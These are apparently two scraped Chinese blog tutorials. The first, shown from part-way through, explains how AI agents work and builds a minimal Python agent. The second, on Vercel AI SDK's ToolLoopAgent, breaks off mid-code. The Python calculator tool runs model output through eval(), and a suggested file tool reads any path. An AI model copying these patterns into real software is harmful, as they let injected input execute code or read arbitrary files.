<p><strong>Agent：</strong> 像下棋一样，会提前规划多步：</p>
<pre><code class="hljs">任务：订一张去上海的机票

Agent的思考过程：
第1步：先查我的日程，看什么时候有空
第2步：搜索那天的航班信息
第3步：比较价格和时间
第4步：选择最优方案
第5步：调用订票API
第6步：发送确认邮件
</code></pre>
<h3 data-id="heading-8">区别3️⃣：纯文本 vs 真实世界交互</h3>








































<table><thead><tr><th>能力</th><th>ChatGPT</th><th>AI Agent</th></tr></thead><tbody><tr><td>读取文件</td><td>❌</td><td>✅</td></tr><tr><td>操作数据库</td><td>❌</td><td>✅</td></tr><tr><td>发送邮件</td><td>❌</td><td>✅</td></tr><tr><td>调用API</td><td>❌</td><td>✅</td></tr><tr><td>生成图片</td><td>❌</td><td>✅</td></tr><tr><td>控制软件</td><td>❌</td><td>✅</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>关键洞察：</strong> ChatGPT是"大脑"，Agent是"大脑+身体"。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">四、Agent的工作原理：感知-决策-执行循环</h2>
<p>所有的AI Agent，无论多复杂，都遵循这个基本循环：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────┐
│                                     │
│  <span class="hljs-number">1</span>. 感知 (Perception)               │
│     ↓                               │
│  <span class="hljs-number">2</span>. 决策 (Decision)                 │
│     ↓                               │
│  <span class="hljs-number">3</span>. 执行 (Action)                   │
│     ↓                               │
│  <span class="hljs-number">4</span>. 观察结果 (Observation)          │
│     ↓                               │
└─────┘ (循环回到第<span class="hljs-number">1</span>步)               │
</code></pre>
<h3 data-id="heading-10">实际例子解析</h3>
<p><strong>任务：</strong> "帮我计算 (123 + 456) × 789"</p>
<pre><code class="hljs language-arduino" lang="arduino">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
【第<span class="hljs-number">1</span>轮】
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💭 Agent思考：
   <span class="hljs-string">"我需要先计算123+456，然后再乘以789"</span>

🔧 Agent行动：
   使用计算器工具
   <span class="hljs-built_in">calculator</span>(<span class="hljs-number">123</span> + <span class="hljs-number">456</span>)

👀 观察结果：
   <span class="hljs-string">"计算结果是 579"</span>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
【第<span class="hljs-number">2</span>轮】
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💭 Agent思考：
   <span class="hljs-string">"现在我需要用579乘以789"</span>

🔧 Agent行动：
   <span class="hljs-built_in">calculator</span>(<span class="hljs-number">579</span> × <span class="hljs-number">789</span>)

👀 观察结果：
   <span class="hljs-string">"计算结果是 456,831"</span>

✅ 任务完成！最终答案：<span class="hljs-number">456</span>,<span class="hljs-number">831</span>
</code></pre>
<p>看到了吗？Agent会<strong>自己拆解任务，一步步执行，直到完成目标</strong>。</p>
<hr/>
<h2 data-id="heading-11">五、动手实践：100行代码实现你的第一个Agent</h2>
<p>理论说再多不如实际跑一遍。现在我们来实现一个真正能用的Agent。</p>
<h3 data-id="heading-12">5.1 准备工作</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装依赖</span>
pip install openai
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置API Key</span>
<span class="hljs-keyword">import</span> openai
openai.api_key = <span class="hljs-string">"你的OpenAI密钥"</span>
</code></pre>
<h3 data-id="heading-13">5.2 完整代码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
一个100行的最小Agent实现
功能：可以使用计算器和搜索工具
"""</span>

<span class="hljs-keyword">import</span> openai
<span class="hljs-keyword">import</span> re

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MinimalAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, tools</span>):
        self.tools = {t[<span class="hljs-string">"name"</span>]: t[<span class="hljs-string">"func"</span>] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tools}
        self.history = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, task, max_steps=<span class="hljs-number">10</span></span>):
        <span class="hljs-string">"""执行任务"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🎯 任务: <span class="hljs-subst">{task}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>}</span>\n"</span>)
        
        <span class="hljs-comment"># 初始化对话</span>
        self.history = [
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: self._system_prompt()},
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: task}
        ]
        
        <span class="hljs-comment"># 主循环</span>
        <span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_steps + <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"【第<span class="hljs-subst">{step}</span>轮】"</span>)
            
            <span class="hljs-comment"># 1. 让LLM思考</span>
            response = self._call_llm()
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"💭 思考: <span class="hljs-subst">{response}</span>\n"</span>)
            
            <span class="hljs-comment"># 2. 检查是否完成</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">"FINISH:"</span> <span class="hljs-keyword">in</span> response:
                answer = response.split(<span class="hljs-string">"FINISH:"</span>)[<span class="hljs-number">1</span>].strip()
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✅ 完成！答案: <span class="hljs-subst">{answer}</span>"</span>)
                <span class="hljs-keyword">return</span> answer
            
            <span class="hljs-comment"># 3. 解析并执行工具</span>
            tool_name, args = self._parse_action(response)
            <span class="hljs-keyword">if</span> tool_name:
                result = self._execute_tool(tool_name, args)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🔧 使用工具: <span class="hljs-subst">{tool_name}</span>(<span class="hljs-subst">{args}</span>)"</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"📊 结果: <span class="hljs-subst">{result}</span>\n"</span>)
                
                <span class="hljs-comment"># 4. 将结果反馈给LLM</span>
                self.history.append({<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: response})
                self.history.append({<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">f"观察: <span class="hljs-subst">{result}</span>"</span>})
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"任务未完成"</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_call_llm</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""调用大语言模型"""</span>
        response = openai.ChatCompletion.create(
            model=<span class="hljs-string">"gpt-3.5-turbo"</span>,
            messages=self.history,
            temperature=<span class="hljs-number">0</span>
        )
        <span class="hljs-keyword">return</span> response.choices[<span class="hljs-number">0</span>].message.content
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_parse_action</span>(<span class="hljs-params">self, response</span>):
        <span class="hljs-string">"""解析工具调用"""</span>
        <span class="hljs-comment"># 匹配格式: USE_TOOL: tool_name(arguments)</span>
        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r"USE_TOOL:\s*(\w+)\((.*?)\)"</span>, response)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_execute_tool</span>(<span class="hljs-params">self, tool_name, args</span>):
        <span class="hljs-string">"""执行工具"""</span>
        <span class="hljs-keyword">if</span> tool_name <span class="hljs-keyword">in</span> self.tools:
            <span class="hljs-keyword">return</span> self.tools[tool_name](args)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"错误: 工具 <span class="hljs-subst">{tool_name}</span> 不存在"</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_system_prompt</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""系统提示词"""</span>
        tool_desc = <span class="hljs-string">"\n"</span>.join([
            <span class="hljs-string">f"- <span class="hljs-subst">{name}</span>"</span> <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self.tools.keys()
        ])
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"""你是一个AI助手，可以使用以下工具：
<span class="hljs-subst">{tool_desc}</span>

使用工具的格式：
USE_TOOL: tool_name(arguments)

完成任务后的格式：
FINISH: 你的最终答案

一步步思考，清晰说明你的推理过程。"""</span>

<span class="hljs-comment"># ========== 定义工具 ==========</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">calculator</span>(<span class="hljs-params">expression</span>):
    <span class="hljs-string">"""计算器工具"""</span>
    <span class="hljs-keyword">try</span>:
        result = <span class="hljs-built_in">eval</span>(expression)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"计算错误"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">query</span>):
    <span class="hljs-string">"""搜索工具（模拟）"""</span>
    <span class="hljs-comment"># 实际应该调用搜索API</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"关于'<span class="hljs-subst">{query}</span>'的搜索结果：[模拟数据]"</span>

<span class="hljs-comment"># ========== 使用示例 ==========</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 创建Agent</span>
    agent = MinimalAgent(tools=[
        {<span class="hljs-string">"name"</span>: <span class="hljs-string">"calculator"</span>, <span class="hljs-string">"func"</span>: calculator},
        {<span class="hljs-string">"name"</span>: <span class="hljs-string">"search"</span>, <span class="hljs-string">"func"</span>: search}
    ])
    
    <span class="hljs-comment"># 执行任务</span>
    result = agent.run(<span class="hljs-string">"计算 (25 + 75) × 4 的结果"</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"最终结果: <span class="hljs-subst">{result}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>}</span>"</span>)
</code></pre>
<h3 data-id="heading-14">5.3 运行效果</h3>
<pre><code class="hljs language-markdown" lang="markdown">==================================================
<span class="hljs-section">🎯 任务: 计算 (25 + 75) × 4 的结果
==================================================</span>

【第1轮】
💭 思考: 我需要先计算 25 + 75，然后将结果乘以 4

🔧 使用工具: calculator(25 + 75)
📊 结果: 100

【第2轮】
💭 思考: 现在我需要将 100 乘以 4

🔧 使用工具: calculator(100 * 4)
📊 结果: 400

【第3轮】
💭 思考: 计算完成
FINISH: 400

✅ 完成！答案: 400

==================================================
<span class="hljs-section">最终结果: 400
==================================================</span>
</code></pre>
<hr/>
<h2 data-id="heading-15">六、代码解析：Agent的4个关键部分</h2>
<h3 data-id="heading-16">1. 系统提示词（System Prompt）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_system_prompt</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"""你是一个AI助手，可以使用以下工具：
<span class="hljs-subst">{tool_desc}</span>

使用工具的格式：
USE_TOOL: tool_name(arguments)
"""</span>
</code></pre>
<blockquote>
<p>💡 <strong>这是Agent的"使用说明书"</strong>，告诉LLM它有什么能力、怎么使用。</p>
</blockquote>
<h3 data-id="heading-17">2. 主循环</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_steps + <span class="hljs-number">1</span>):
    response = self._call_llm()      <span class="hljs-comment"># 思考</span>
    tool_name, args = self._parse_action(response)  <span class="hljs-comment"># 解析</span>
    result = self._execute_tool(tool_name, args)    <span class="hljs-comment"># 执行</span>
    <span class="hljs-comment"># 反馈给LLM继续思考</span>
</code></pre>
<blockquote>
<p>💡 <strong>这是Agent的"心跳"</strong>，不断循环直到任务完成。</p>
</blockquote>
<h3 data-id="heading-18">3. 工具解析</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_parse_action</span>(<span class="hljs-params">self, response</span>):
    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r"USE_TOOL:\s*(\w+)\((.*?)\)"</span>, response)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)
</code></pre>
<blockquote>
<p>💡 <strong>这是Agent的"翻译器"</strong>，把LLM的想法转换成实际操作。</p>
</blockquote>
<h3 data-id="heading-19">4. 历史记录</h3>
<pre><code class="hljs language-python" lang="python">self.history.append({<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: response})
self.history.append({<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">f"观察: <span class="hljs-subst">{result}</span>"</span>})
</code></pre>
<blockquote>
<p>💡 <strong>这是Agent的"记忆"</strong>，记住之前做了什么、结果如何。</p>
</blockquote>
<hr/>
<h2 data-id="heading-20">七、试试更复杂的任务</h2>
<p>现在我们让Agent处理一个更实际的问题：</p>
<pre><code class="hljs language-python" lang="python">agent.run(<span class="hljs-string">"""
今天是2024年1月15日，请帮我：
1. 计算距离春节（2月10日）还有多少天
2. 搜索一下春节旅游推荐
"""</span>)
</code></pre>
<p><strong>Agent会这样工作：</strong></p>
<pre><code class="hljs language-ini" lang="ini">【第1轮】
💭 思考: 需要计算1月15日到2月10日的天数
      1月剩余：<span class="hljs-attr">31-15</span>=<span class="hljs-number">16</span>天
      2月到10日：10天
      总计：16+<span class="hljs-attr">10</span>=<span class="hljs-number">26</span>天

🔧 使用工具: calculator(31 - 15 + 10)
📊 结果: 26

【第2轮】
💭 思考: 现在搜索春节旅游推荐

🔧 使用工具: search(2024春节旅游推荐)
📊 结果: 关于'2024春节旅游推荐'的搜索结果...

【第3轮】
💭 思考: 已经完成两个任务
FINISH: 
  距离春节还有26天
  春节旅游推荐：<span class="hljs-section">[搜索结果]</span>
</code></pre>
<p><strong>看到了吗？Agent自己拆解任务、分步执行、整合结果。</strong></p>
<hr/>
<h2 data-id="heading-21">八、现在你可以做什么？</h2>
<h3 data-id="heading-22">💪 立即尝试</h3>
<ol>
<li><strong>复制上面的代码</strong>，在本地运行</li>
<li><strong>修改任务</strong>，看Agent怎么处理</li>
<li><strong>添加新工具</strong>，比如：
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">filename</span>):
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">return</span> f.read()
</code></pre>
</li>
</ol>
<h3 data-id="heading-23">🎯 练习题</h3>
<p>尝试让你的Agent完成这些任务：</p>
<ol>
<li>✅ 简单：计算一个复杂的数学表达式</li>
<li>✅ 中等：读取一个文本文件并统计字数</li>
<li>✅ 困难：分析CSV文件并生成报表</li>
</ol>
<h3 data-id="heading-24">📚 下期预告</h3>
<p>下一篇我们将深入探讨：</p>
<ul>
<li>ReAct模式的论文原理</li>
<li>LangChain、AutoGPT如何实现ReAct</li>
<li>更强大的Prompt工程技巧</li>
<li>处理复杂任务的策略</li>
</ul>
<hr/>
<h2 data-id="heading-25">总结</h2>
<p>✅ <strong>AI Agent = 大脑（LLM）+ 手脚（工具）+ 循环（反馈）</strong><br/>
✅ <strong>核心工作流程：感知 → 决策 → 执行 → 观察 → 循环</strong><br/>
✅ <strong>100行代码就能实现一个可用的Agent</strong><br/>
✅ <strong>Prompt是Agent的"操作系统"</strong></p>
<blockquote>
<p>💡 <strong>核心洞察：</strong> Agent的强大不在于模型本身，而在于"思考-行动-反馈"的循环机制。</p>
</blockquote>
<hr/>
<p><strong>如果这篇文章对你有帮助：</strong></p>
<ul>
<li>👍 点个赞，让更多人看到</li>
<li>🔖 收藏起来，方便随时查阅</li>
<li>📤 转发给需要的朋友</li>
</ul>
<p><strong>下期见！</strong>
本文是《AI Agent实战系列》第1篇，后续还会更新AI Agent进阶玩法。关注公众号【架构之旅】，第一时间解锁全套实战教程，错过不再补～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Vercel AI SDK 使用指南：构建强大的 AI Agent]]></title>    <link>https://juejin.cn/post/7605552034570354734</link>    <guid>https://juejin.cn/post/7605552034570354734</guid>    <pubDate>2026-02-12T12:00:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605552034570354734" data-draft-id="7605780454579847219" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 Vercel AI SDK 使用指南：构建强大的 AI Agent"/> <meta itemprop="keywords" content="Agent,LangChain"/> <meta itemprop="datePublished" content="2026-02-12T12:00:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZaneAI"/> <meta itemprop="url" content="https://juejin.cn/user/186266444380203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 Vercel AI SDK 使用指南：构建强大的 AI Agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/186266444380203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZaneAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:00:48.000Z" title="Thu Feb 12 2026 12:00:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着 Vercel AI SDK 6 的发布，构建 AI Agent 变得前所未有的简单和规范。新的 <code>ToolLoopAgent</code> 类为我们提供了一种结构化的方式来封装 LLM 配置、工具（Tools）和行为。</p>
<p>如果你正在寻找一种方法来<strong>复用模型配置</strong>、<strong>统一 Agent 行为</strong>，或者希望在 Next.js/Node.js 项目中获得<strong>极致的 TypeScript 类型安全</strong>，那么这篇教程就是为你准备的。</p>
<p>本文将带你深入了解如何使用 <code>ToolLoopAgent</code> 构建一个具备多步推理能力的 AI Agent。</p>
<h2 data-id="heading-0">为什么选择 ToolLoopAgent？</h2>
<p>在开发 AI 应用时，我们经常面临以下痛点：</p>
<ul>
<li><strong>配置重复</strong>：在不同的 API 路由中重复编写相同的 prompt 和模型参数。</li>
<li><strong>状态管理复杂</strong>：手动处理“工具调用 -&gt; 执行工具 -&gt; 再次调用 LLM”的循环（Agent Loop）非常繁琐。</li>
<li><strong>类型缺失</strong>：很难保证前端组件和后端 Agent 之间的消息类型一致。</li>
</ul>
<p><code>ToolLoopAgent</code> 完美解决了这些问题。它内置了自动循环机制，允许 LLM 连续多次调用工具以完成复杂任务。</p>
<h2 data-id="heading-1">1. 环境准备</h2>
<p>确保你的项目中已经安装了 <code>ai</code> 和 <code>zod</code>：</p>
<p>Bash</p>
<pre><code class="hljs">npm install ai zod
</code></pre>
<h2 data-id="heading-2">2. 快速上手：定义你的第一个 Agent</h2>
<p>我们首先创建一个基础的 Agent。<code>ToolLoopAgent</code> 允许你在一个地方统一定义模型和系统指令。</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;

<span class="hljs-comment">// 定义一个通用的 Agent</span>
<span class="hljs-keyword">const</span> myAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-comment">// 指定模型，例如 Anthropic Claude 或 OpenAI GPT</span>
  <span class="hljs-attr">model</span>: <span class="hljs-string">"anthropic/claude-sonnet-4.5"</span>,
  <span class="hljs-comment">// 系统指令：赋予 Agent 角色</span>
  <span class="hljs-attr">instructions</span>: <span class="hljs-string">'You are a helpful assistant.'</span>,
});
</code></pre>
<p>这个 <code>myAgent</code> 实例现在可以在你应用的任何地方被复用。</p>
<h2 data-id="heading-3">3. 赋予能力：添加工具 (Tools)</h2>
<p>Agent 的核心在于使用工具。我们可以通过 <code>tools</code> 属性并结合 <code>zod</code> 来定义工具的输入结构。</p>
<p>以下是一个拥有“代码执行”能力的 Agent 示例：</p>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { ToolLoopAgent, tool } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">codeAgent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  model: <span class="hljs-string">"anthropic/claude-sonnet-4.5"</span>,
  instructions: <span class="hljs-string">'You are an expert software engineer.'</span>,
  tools: {
    runCode: <span class="hljs-title function_ invoke__">tool</span>({
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Execute Python code'</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-keyword">object</span>({
        <span class="hljs-attr">code</span>: z.<span class="hljs-keyword">string</span>().<span class="hljs-title function_ invoke__">describe</span>(<span class="hljs-string">'The python code to execute'</span>),
      }),
      execute: <span class="hljs-title function_ invoke__">async</span> ({ code }) =&gt; {
        <span class="hljs-comment">// 在这里编写实际的执行逻辑</span>
        console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">'Executing:'</span>, code);
        <span class="hljs-keyword">return</span> { output: <span class="hljs-string">'Code executed successfully'</span> };
      },
    }),
  },
});
</code></pre>
<h2 data-id="heading-4">4. 掌控流程：循环控制 (Loop Control)</h2>
<p>默认情况下，Agent 的运行步数可能有限制。对于需要多步推理（例如：搜索 -&gt; 阅读 -&gt; 总结）的任务，我们需要配置 <code>stopWhen</code>。</p>
<p><code>stepCountIs</code> 帮助我们定义最大迭代次数：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, stepCountIs } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;

<span class="hljs-keyword">const</span> researchAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">"anthropic/claude-sonnet-4.5"</span>,
  <span class="hljs-comment">// 允许 Agent 最多运行 20 个步骤</span>
  <span class="hljs-comment">// 每一轮（生成文本或调用工具）算作一个步骤</span>
  <span class="hljs-attr">stopWhen</span>: <span class="hljs-title function_">stepCountIs</span>(<span class="hljs-number">20</span>), 
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 假设这里有一些搜索工具</span>
  }
});
